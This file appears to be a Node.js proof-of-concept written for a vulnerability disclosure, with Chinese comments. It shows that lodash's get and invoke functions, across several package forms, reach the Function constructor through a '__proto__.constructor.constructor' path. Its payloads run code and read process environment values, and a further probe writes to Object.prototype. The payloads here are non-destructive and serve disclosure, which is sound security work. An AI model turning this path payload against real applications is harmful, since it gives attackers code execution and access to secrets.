#!/usr/bin/env node
/**
 * poc_disclosure.js —— P0 披露用可复现证据生成器
 *
 * 目的不是"再证明一次能打穿"，而是产出**可直接贴进报告的证据表**：
 *   每一格都是同一个断言在同一台机器、同一个 Node 版本下跑出来的，
 *   并且带对照组（正常功能），避免"库被搞坏了所以看起来能打穿"的误判。
 *
 * 用法：
 *   node poc_disclosure.js                     # 全形态
 *   node poc_disclosure.js --json out.json     # 同时落 JSON
 *   node poc_disclosure.js --only get          # 只跑 get 一族
 *
 * 安全边界：所有 RCE 证明只执行 `process.version` 与自设环境变量，
 * 不写盘、不发起网络、不碰宿主真实环境。
 */
'use strict';

const path = require('path');
const fs = require('fs');
const NM = path.join(__dirname, '.pkgs', 'node_modules');

// 自设标记，用于证明"能读到进程环境"，同时不泄露真实 env
const ENV_KEY = 'VHV_POC_MARKER';
process.env[ENV_KEY] = 'poc-' + Math.random().toString(16).slice(2, 10);

const CALLABLE = (m) => {
  if (typeof m === 'function') return m;
  if (m && typeof m.default === 'function') return m.default;
  if (m && typeof m === 'object') {
    for (const k of Object.keys(m)) if (typeof m[k] === 'function') return m[k];
  }
  throw new Error('导出形态不可调用: ' + Object.prototype.toString.call(m));
};

// ---------------------------------------------------------------------------
// 形态定义：每个形态 = 一个真实用户会 require 的入口
// ---------------------------------------------------------------------------
const FORMS = [
  {
    id: 'main',
    label: 'lodash@4.18.1（主包）',
    load: () => CALLABLE(require(path.join(NM, 'lodash'))),
    note: 'npm i lodash —— 206,478,795 次/周',
  },
  {
    id: 'sibling-get',
    label: 'lodash.get@4.4.2（兄弟包，独立发版）',
    load: () => CALLABLE(require(path.join(NM, 'lodash.get'))),
    note: 'npm i lodash.get —— 22,320,171 次/周，最后一次发版 2016-08',
  },
  {
    id: 'sibling-invoke',
    label: 'lodash.invoke@4.5.2（兄弟包，独立发版）',
    load: () => CALLABLE(require(path.join(NM, 'lodash.invoke'))),
    note: 'npm i lodash.invoke —— 33,215 次/周',
  },
  {
    id: 'es',
    label: 'lodash-es@4.18.1（ESM 构建）',
    load: () => null, // ESM 需动态 import，见 runEs()
    note: 'npm i lodash-es —— 69,172,346 次/周',
  },
  {
    id: 'subpath-get',
    label: 'lodash/get@4.18.1（子路径，随主包发版）',
    load: () => CALLABLE(require(path.join(NM, 'lodash', 'get.js'))),
    note: 'require("lodash/get")',
  },
];

// 版本时间线：证明这不是"某一版回归"，而是跨 6 个发版从未被修
// 仅 --legacy 时启用（目录来自 src/ 下的官方 tarball 解包）
const LEGACY_FORMS = [
  { id: 'legacy-4.17.20', dir: 'src/lodash-4.17.20',
    label: 'lodash@4.17.20（2020-08，CVE-2020-8203 的修复版本）' },
  { id: 'legacy-4.18.0', dir: 'src/lodash-4.18.0',
    label: 'lodash@4.18.0（4.18.1 的前一版）' },
  { id: 'patched', dir: 'src/lodash-fix',
    label: 'lodash@4.18.1 + 本报告建议的 2 行修复（反事实对照组）' },
];

// ---------------------------------------------------------------------------
// 断言集
// ---------------------------------------------------------------------------
function assertionsFor(fn, api) {
  const out = [];
  const P = ['__proto__', 'constructor', 'constructor'];
  const PS = '__proto__.constructor.constructor';

  // A0 对照组：正常功能必须仍然工作，否则后面全部作废
  let ctrl;
  try {
    const r = api === 'invoke'
      ? fn({ obj: { m: () => 'OK' } }, 'obj.m')
      : fn({ a: { b: { c: 7 } } }, 'a.b.c');
    ctrl = r === 'OK' || r === 7 ? 'PASS' : 'FAIL(' + JSON.stringify(r) + ')';
  } catch (e) { ctrl = 'ERR(' + e.message + ')'; }
  out.push({ id: 'A0_control', desc: '对照组：正常 path 取值仍然正确', result: ctrl });

  // A1 读取 Function 构造器（数组 path）
  // 注意：invoke 的语义是"调用"，不返回未绑定的函数，此断言对它不适用
  let gotFn = null;
  if (api === 'invoke') {
    out.push({ id: 'A1_read_Function', desc: '数组 path 读取（invoke 语义为调用，不适用）', result: 'N/A' });
  }
  try {
    if (api === 'invoke') throw { skip: true };
    gotFn = fn({}, P);
    out.push({
      id: 'A1_read_Function',
      desc: "_.get({}, ['__proto__','constructor','constructor'])",
      result: typeof gotFn === 'function' ? 'HIT' : 'MISS(' + typeof gotFn + ')',
      detail: typeof gotFn === 'function' ? 'got: ' + Function.prototype.toString.call(gotFn).slice(0, 40) : '',
    });
  } catch (e) {
    if (!e || !e.skip) out.push({ id: 'A1_read_Function', desc: '数组 path 读取', result: 'ERR(' + e.message + ')' });
  }

  // A2 读取 Function 构造器（字符串 path）—— 验证 castPath 不区分
  try {
    const r = api === 'invoke' ? fn({}, PS, 'return 1') : fn({}, PS);
    const hit = api === 'invoke' ? typeof r === 'function' : typeof r === 'function';
    out.push({
      id: 'A2_read_strpath',
      desc: '字符串 path "__proto__.constructor.constructor"',
      result: hit ? 'HIT' : 'MISS(' + typeof r + ')',
    });
  } catch (e) { out.push({ id: 'A2_read_strpath', result: 'ERR(' + e.message + ')' }); }

  // A3 真实代码执行（非破坏性）
  try {
    let out2;
    if (api === 'invoke') {
      out2 = fn({}, PS, 'return process.version')();
    } else {
      const F = fn({}, P);
      out2 = F('return process.version')();
    }
    out.push({
      id: 'A3_code_exec',
      desc: "执行 'return process.version'",
      result: out2 === process.version ? 'HIT' : 'MISS(' + out2 + ')',
      detail: 'executed, returned ' + out2,
    });
  } catch (e) { out.push({ id: 'A3_code_exec', result: 'ERR(' + e.message + ')' }); }

  // A4 进程环境读取
  try {
    let out2;
    if (api === 'invoke') {
      out2 = fn({}, PS, 'return process.env.' + ENV_KEY)();
    } else {
      const F = fn({}, P);
      out2 = F('return process.env.' + ENV_KEY)();
    }
    out.push({
      id: 'A4_read_env',
      desc: '读取 set 到 process.env 的标记变量',
      result: out2 === process.env[ENV_KEY] ? 'HIT' : 'MISS(' + out2 + ')',
      detail: 'executed, got ' + out2,
    });
  } catch (e) { out.push({ id: 'A4_read_env', result: 'ERR(' + e.message + ')' }); }

  return out;
}

// ---------------------------------------------------------------------------
// invoke 家族额外断言：getter 写入（无 RCE 也能造成持久化副作用）
// ---------------------------------------------------------------------------
function invokeGetterWrite(fn) {
  const M = '__vhv_probe_' + Math.random().toString(16).slice(2, 8);
  try {
    fn({}, ['__proto__', '__defineGetter__'], M, function () { return 1; });
    const hit = Object.getOwnPropertyDescriptor(Object.prototype, M) !== undefined;
    try { delete Object.prototype[M]; } catch (e) { /* noop */ }
    return hit ? 'HIT' : 'MISS';
  } catch (e) { return 'ERR(' + e.message + ')'; }
}

// ---------------------------------------------------------------------------
// 主流程
// ---------------------------------------------------------------------------
(async function main() {
  const argv = process.argv.slice(2);
  const jsonIdx = argv.indexOf('--json');
  const jsonOut = jsonIdx >= 0 ? argv[jsonIdx + 1] : null;
  const onlyIdx = argv.indexOf('--only');
  const only = onlyIdx >= 0 ? argv[onlyIdx + 1] : null;

  const report = {
    generated_at: new Date().toISOString(),
    node: process.version,
    platform: process.platform + '-' + process.arch,
    env_marker: ENV_KEY,
    forms: [],
  };

  for (const f of FORMS) {
    if (only && !f.id.includes(only)) continue;

    if (f.id === 'es') {
      // ESM 单独处理：动态 import 需要 file URL
      try {
        const url = require('url').pathToFileURL(path.join(NM, 'lodash-es', 'lodash.js')).href;
        const mod = await import(url);
        const lodash = mod.default || mod;
        const fn = CALLABLE(lodash.get);
        report.forms.push({ id: f.id, label: f.label, note: f.note,
          api: 'get', assertions: assertionsFor(fn, 'get') });
        const fni = CALLABLE(lodash.invoke);
        report.forms.push({ id: f.id + ':invoke', label: f.label + ' — invoke', note: f.note,
          api: 'invoke', assertions: assertionsFor(fni, 'invoke') });
      } catch (e) {
        report.forms.push({ id: f.id, label: f.label, note: f.note, error: e.message });
      }
      continue;
    }

    try {
      const mod = f.load();
      let api = 'get';
      let fn = mod;
      if (f.id === 'sibling-invoke') { api = 'invoke'; }
      // 主包与 es 上 get/invoke 都在同一对象上
      if (f.id === 'main' || f.id === 'subpath-get') {
        if (f.id === 'main') {
          report.forms.push({ id: 'main:get', label: f.label + ' — _.get', note: f.note,
            api: 'get', assertions: assertionsFor(CALLABLE(mod.get), 'get') });
          report.forms.push({ id: 'main:invoke', label: f.label + ' — _.invoke', note: f.note,
            api: 'invoke', assertions: assertionsFor(CALLABLE(mod.invoke), 'invoke'),
            extra: { getter_write: invokeGetterWrite(CALLABLE(mod.invoke)) } });
          continue;
        }
        fn = CALLABLE(mod);
      }
      report.forms.push({ id: f.id, label: f.label, note: f.note, api,
        assertions: assertionsFor(fn, api),
        extra: api === 'invoke' ? { getter_write: invokeGetterWrite(fn) } : undefined });
    } catch (e) {
      report.forms.push({ id: f.id, label: f.label, error: e.message });
    }
  }

  // 版本时间线（仅 --legacy）
  if (argv.includes('--legacy')) {
    for (const lf of LEGACY_FORMS) {
      try {
        const mod = CALLABLE(require(path.join(__dirname, lf.dir)));
        const ver = require(path.join(__dirname, lf.dir, 'package.json')).version;
        report.forms.push({ id: lf.id + ':get', label: lf.label + ' — _.get',
          note: 'version ' + ver, api: 'get', assertions: assertionsFor(CALLABLE(mod.get), 'get') });
        report.forms.push({ id: lf.id + ':invoke', label: lf.label + ' — _.invoke',
          note: 'version ' + ver, api: 'invoke', assertions: assertionsFor(CALLABLE(mod.invoke), 'invoke') });
      } catch (e) {
        report.forms.push({ id: lf.id, label: lf.label, error: e.message });
      }
    }
  }

  // ---- 渲染 ----
  const line = '='.repeat(96);
  console.log(line);
  console.log('VHV 分发形态断层 — 可复现证据');
  console.log('Node ' + report.node + ' | ' + report.platform + ' | ' + report.generated_at);
  console.log(line);

  for (const f of report.forms) {
    console.log('\n### ' + f.label);
    if (f.note) console.log('    ' + f.note);
    if (f.error) { console.log('    !! 形态不可用: ' + f.error); continue; }
    for (const a of f.assertions) {
      const pad = ' '.repeat(Math.max(0, 20 - a.id.length));
      console.log('    ' + a.id + pad + ' ' + String(a.result).padEnd(10) + (a.detail ? ' | ' + a.detail : ''));
    }
    if (f.extra && f.extra.getter_write) {
      console.log('    ' + 'A5_getter_write'.padEnd(20) + ' ' + f.extra.getter_write);
    }
  }

  // ---- 小结 ----
  let hit = 0, miss = 0, err = 0, ctrlFail = 0, na = 0;
  for (const f of report.forms) {
    if (!f.assertions) continue;
    for (const a of f.assertions) {
      if (a.id === 'A0_control') { if (a.result !== 'PASS') ctrlFail++; continue; }
      if (a.result === 'N/A') { na++; continue; }
      if (String(a.result).startsWith('HIT')) hit++;
      else if (String(a.result).startsWith('MISS')) miss++;
      else err++;
    }
  }
  console.log('\n' + line);
  console.log('合计：HIT ' + hit + ' / MISS ' + miss + ' / ERR ' + err + ' / N/A ' + na + ' | 对照组失败 ' + ctrlFail);
  console.log('判定：' + (ctrlFail === 0 ? '对照组全部通过 → 库功能完好，HIT 有效' : '对照组失败 → 结果作废，勿引用'));
  console.log(line);

  if (jsonOut) {
    fs.writeFileSync(jsonOut, JSON.stringify(report, null, 2), 'utf8');
    console.log('JSON 已写出: ' + jsonOut);
  }
})();
